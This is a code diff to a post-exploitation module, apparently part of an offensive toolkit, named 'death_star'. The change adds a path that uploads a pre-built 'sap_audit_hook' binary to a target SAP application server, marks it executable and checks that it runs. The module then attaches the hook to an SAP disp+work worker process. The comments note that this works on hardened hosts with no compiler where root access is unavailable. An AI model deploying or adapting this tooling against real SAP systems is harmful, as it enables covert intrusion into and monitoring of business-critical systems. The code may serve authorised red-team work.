@@ -53,12 +53,16 @@ from typing import Optional
 
 logger = logging.getLogger(__name__)
 
-# Vendored source lives next to this module.  Kept as .c source rather
-# than a pre-built binary so the operator can inspect + audit + rebuild
-# for their target's glibc.  Compilation happens on the target itself.
+# Vendored source + optional pre-built binary.  When the pre-built
+# binary is present in the vendor dir, deploy_and_launch() prefers it
+# over the compile-on-target flow — critical for hardened SAP hosts
+# where no C compiler is installed (``gcc: command not found``).  Build
+# with ``modules/postex/vendor/build_sap_audit_hook.sh``.
 _VENDOR_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "vendor")
 HOOK_SOURCE_PATH = os.path.join(_VENDOR_DIR, "sap_audit_hook.c")
+HOOK_PREBUILT_PATH = os.path.join(_VENDOR_DIR,
+                                    "sap_audit_hook.linux-x86_64")
 
 # Default install layout on the target.  ``<sid>adm`` always has write
 # access to ``/tmp`` and can execute from it (SAP hosts don't ship with
@@ -518,6 +522,79 @@ def compile_hook(node, source_path: str,
 
 
 # ---------------------------------------------------------------------------
+# Pre-built binary upload (no compile required on target)
+# ---------------------------------------------------------------------------
+
+def has_prebuilt_binary() -> bool:
+    """True when ``modules/postex/vendor/sap_audit_hook.linux-x86_64``
+    exists and is non-empty.  Callers use this to decide whether to
+    take the fast/simple path (upload binary → chmod → launch) vs. the
+    compile-on-target path (upload source → gcc → launch).
+    """
+    try:
+        return (os.path.isfile(HOOK_PREBUILT_PATH)
+                and os.path.getsize(HOOK_PREBUILT_PATH) > 0)
+    except OSError:
+        return False
+
+
+def upload_prebuilt_binary(node,
+                             binary_path: Optional[str] = None,
+                             remote_dir: str = DEFAULT_REMOTE_DIR) -> str:
+    """Upload the vendored pre-built ``sap_audit_hook`` binary to the
+    target, chmod +x it, and verify it can execute.
+
+    Skips compilation entirely — the caller doesn't need a compiler
+    on the target.  This is the deployment path for hardened SAP
+    application servers (SUSE Linux Enterprise Server for SAP
+    Applications, RHEL for SAP, etc.) where ``gcc`` isn't installed
+    and root install is not an option.
+
+    Returns the absolute remote path to the executable binary.  Raises
+    ``DeathStarError`` when the vendored binary is missing or the
+    chmod/verify step fails.
+    """
+    if not has_prebuilt_binary():
+        raise DeathStarError(
+            f"pre-built binary not found at {HOOK_PREBUILT_PATH!r}.  "
+            "Build it locally: "
+            "``cd modules/postex/vendor/ && ./build_sap_audit_hook.sh``")
+    if binary_path is None:
+        binary_path = f"{remote_dir.rstrip('/')}/{DEFAULT_BINARY_NAME}"
+
+    with open(HOOK_PREBUILT_PATH, "rb") as fh:
+        binary_bytes = fh.read()
+
+    _write_remote_file(node, binary_path, binary_bytes,
+                        label=(f"upload pre-built binary "
+                                f"({len(binary_bytes)} B) → {binary_path}"))
+
+    # chmod +x — SXPG-safe two-token argv.
+    r = _run(node, "chmod", f"+x {binary_path}",
+              label=f"chmod +x {binary_path}")
+    if not r.get("success"):
+        raise DeathStarError(
+            f"chmod +x failed: {r.get('error') or 'unknown'}")
+
+    # Sanity — run `--help` and check the output contains "sap_audit_hook"
+    # or "Usage:" (both appear in Julian's --help output).  A broken /
+    # corrupted upload would fail this test.
+    check = _run(node, binary_path, "--help",
+                  label=f"verify binary — {binary_path} --help")
+    got = " ".join(check.get("output") or []).lower()
+    if ("sap_audit_hook" not in got and "usage:" not in got):
+        raise DeathStarError(
+            f"pre-built binary at {binary_path} does not produce "
+            f"expected --help output — corrupted upload or "
+            f"incompatible target ABI (need Linux x86_64).  Got: "
+            f"{got[:200]!r}")
+    print(f"[+] {node.sid}: death_star: pre-built binary deployed — "
+           f"{binary_path} ({len(binary_bytes)} B, "
+           f"no compile needed on target)")
+    return binary_path
+
+
+# ---------------------------------------------------------------------------
 # Worker-PID discovery
 # ---------------------------------------------------------------------------
 
@@ -944,15 +1021,35 @@ def deploy_and_launch(node, filter_classes: str = "",
                         target_pid: Optional[int] = None,
                         skip_upload: bool = False,
                         skip_compile: bool = False,
+                        force_source: bool = False,
                         verbose: bool = False) -> dict:
-    """Full pipeline: upload → compile → find worker → launch.
+    """Full pipeline: upload → (compile) → find worker → launch.
+
+    Two deployment paths, auto-selected in this order:
+
+    1. **Pre-built binary path** (preferred when
+       ``modules/postex/vendor/sap_audit_hook.linux-x86_64`` exists):
+       upload the vendored binary → chmod +x → verify → launch.
+       No compiler needed on the target — the deployment path for
+       hardened SAP application servers.
+
+    2. **Compile-on-target path**: upload ``sap_audit_hook.c`` →
+       gcc/cc/clang → launch.  Fallback for arch mismatches or when
+       the vendored binary is intentionally omitted.
+
+    ``force_source=True`` forces path 2 even when the pre-built binary
+    is present — for operators who want to inspect and rebuild the
+    source themselves.
 
     Returns::
 
         {
           ok, source_path, binary_path, target_pid, target_comm,
-          hook_pid, log_path, pidfile_path, filter_classes,
+          hook_pid, log_path, pidfile_path, filter_classes, mode,
         }
+
+    ``mode`` is ``"prebuilt"`` or ``"compile"`` so the operator can
+    tell after the fact which deployment path was used.
 
     Raises ``DeathStarError`` on any step failure; the exception message
     is human-readable and suitable for surfacing to the operator.
@@ -969,10 +1066,15 @@ def deploy_and_launch(node, filter_classes: str = "",
                        survives long enough for the hook lifetime.
       target_pid:      Force a specific disp+work PID.  When ``None``,
                        we auto-pick the first ``_W<n>`` worker.
-      skip_upload:     Reuse a previously-uploaded ``sap_audit_hook.c``
-                       — useful for reruns during operator iteration.
-      skip_compile:    Reuse a previously-compiled ``sap_audit_hook``
-                       binary — same rationale.
+      skip_upload:     Reuse a previously-uploaded source (compile
+                       path) or previously-uploaded binary (pre-built
+                       path).  Useful for reruns during operator
+                       iteration.
+      skip_compile:    Compile-path only — reuse a previously-compiled
+                       ``sap_audit_hook`` binary.  Ignored in
+                       pre-built mode.
+      force_source:    Force the compile-on-target path even when a
+                       vendored pre-built binary is present.
       verbose:         Pass ``-v`` to the hook.  Turns on hook-side
                        diagnostic prints to the log file.
     """
@@ -981,17 +1083,40 @@ def deploy_and_launch(node, filter_classes: str = "",
     log_path = f"{remote_dir.rstrip('/')}/{DEFAULT_LOG_NAME}"
     pidfile_path = f"{remote_dir.rstrip('/')}/{DEFAULT_PIDFILE_NAME}"
 
-    if not skip_upload:
-        upload_source(node, remote_dir=remote_dir)
+    use_prebuilt = has_prebuilt_binary() and not force_source
+    if use_prebuilt:
+        mode = "prebuilt"
+        print(f"[*] {node.sid}: death_star: using pre-built binary "
+               f"(no compiler needed on target)")
+        if not skip_upload:
+            upload_prebuilt_binary(node,
+                                     binary_path=binary_path,
+                                     remote_dir=remote_dir)
+        else:
+            print(f"[*] {node.sid}: death_star: skip_upload — reusing "
+                   f"{binary_path}")
     else:
-        print(f"[*] {node.sid}: death_star: skip_upload — reusing "
-              f"{source_path}")
-
-    if not skip_compile:
-        compile_hook(node, source_path, binary_path)
-    else:
-        print(f"[*] {node.sid}: death_star: skip_compile — reusing "
-              f"{binary_path}")
+        mode = "compile"
+        if force_source:
+            print(f"[*] {node.sid}: death_star: force_source=True — "
+                   f"skipping pre-built binary, will compile on target")
+        else:
+            print(f"[*] {node.sid}: death_star: no pre-built binary "
+                   f"vendored — will compile on target "
+                   f"(build one with "
+                   f"modules/postex/vendor/build_sap_audit_hook.sh "
+                   f"to skip this)")
+        if not skip_upload:
+            upload_source(node, remote_dir=remote_dir)
+        else:
+            print(f"[*] {node.sid}: death_star: skip_upload — reusing "
+                   f"{source_path}")
+        if not skip_compile:
+            compile_hook(node, source_path, binary_path,
+                          remote_dir=remote_dir)
+        else:
+            print(f"[*] {node.sid}: death_star: skip_compile — reusing "
+                   f"{binary_path}")
 
     if target_pid is None:
         target_pid, target_comm = find_worker_pid(node)
@@ -1007,7 +1132,8 @@ def deploy_and_launch(node, filter_classes: str = "",
 
     return {
         "ok": True,
-        "source_path": source_path,
+        "mode": mode,
+        "source_path": source_path if mode == "compile" else "",
         "binary_path": binary_path,
         "target_pid": target_pid,
         "target_comm": target_comm,
